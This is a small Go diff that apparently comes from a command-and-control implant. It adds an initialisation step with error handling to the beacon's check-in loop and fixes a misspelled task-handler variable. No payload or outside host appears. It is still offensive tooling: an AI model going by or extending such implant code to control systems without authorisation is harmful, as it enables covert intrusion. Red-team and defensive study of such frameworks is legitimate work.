@@ -244,7 +244,14 @@ var (
 
 func beaconMainLoop(beacon *transports.Beacon) error {
 	// Register beacon
-	err := beacon.Start()
+	err := beacon.Init()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] init failure %s", err)
+		// {{end}}
+		return err
+	}
+	err = beacon.Start()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Error starting beacon: %s", err)
@@ -354,7 +361,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
 	sysHandlers := handlers.GetSystemHandlers()
-	specHandlesr := handlers.GetSpecialHandlers()
+	specHandlers := handlers.GetSpecialHandlers()
 
 	for _, task := range tasks.Tasks {
 		// {{if .Config.Debug}}
@@ -387,7 +394,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 				Data: []byte{},
 			})
 			resultsMutex.Unlock()
-		} else if handler, ok := specHandlesr[task.Type]; ok {
+		} else if handler, ok := specHandlers[task.Type]; ok {
 			wg.Add(1)
 			handler(task.Data, nil)
 		} else {
